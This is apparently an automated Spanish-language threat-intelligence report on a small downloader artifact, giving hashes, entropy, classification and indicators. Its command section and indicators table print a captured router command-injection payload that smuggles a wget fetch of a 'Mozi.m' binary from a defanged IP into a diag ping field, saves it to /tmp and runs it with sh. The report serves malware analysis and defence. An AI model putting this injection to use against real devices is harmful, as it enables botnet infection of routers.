# 🧬 Payload Analysis

`755897b1acf509fc7f1cfbf4e0f73ad70e74e35ff1bd35d302bc40fb769d360f`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 138 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://100.5.110.XXX:51986/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:50:14.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `755897b1acf509fc7f1cfbf4e0f73ad70e74e35ff1bd35d302bc40fb769d360f`
- **SHA1:** `dce18fdd036bc52ceb4e8dfd48b2ffc546ba55e6`
- **MD5:** `3f189c22be46620892fe95df041e0e16`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 138 B |
| Entropía | 5.07 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://100.5.110.XXX:51986/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://100.5.110.XXX:51986/Mozi.m+-O+- | strings |
| ip | 100.5.110.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://100.5.110.XXX:51986/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | 755897b1acf509fc7f1cfbf4e0f73ad70e74e35ff1bd35d302bc40fb769d360f | static_analysis |
| ip | 162.4.163.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
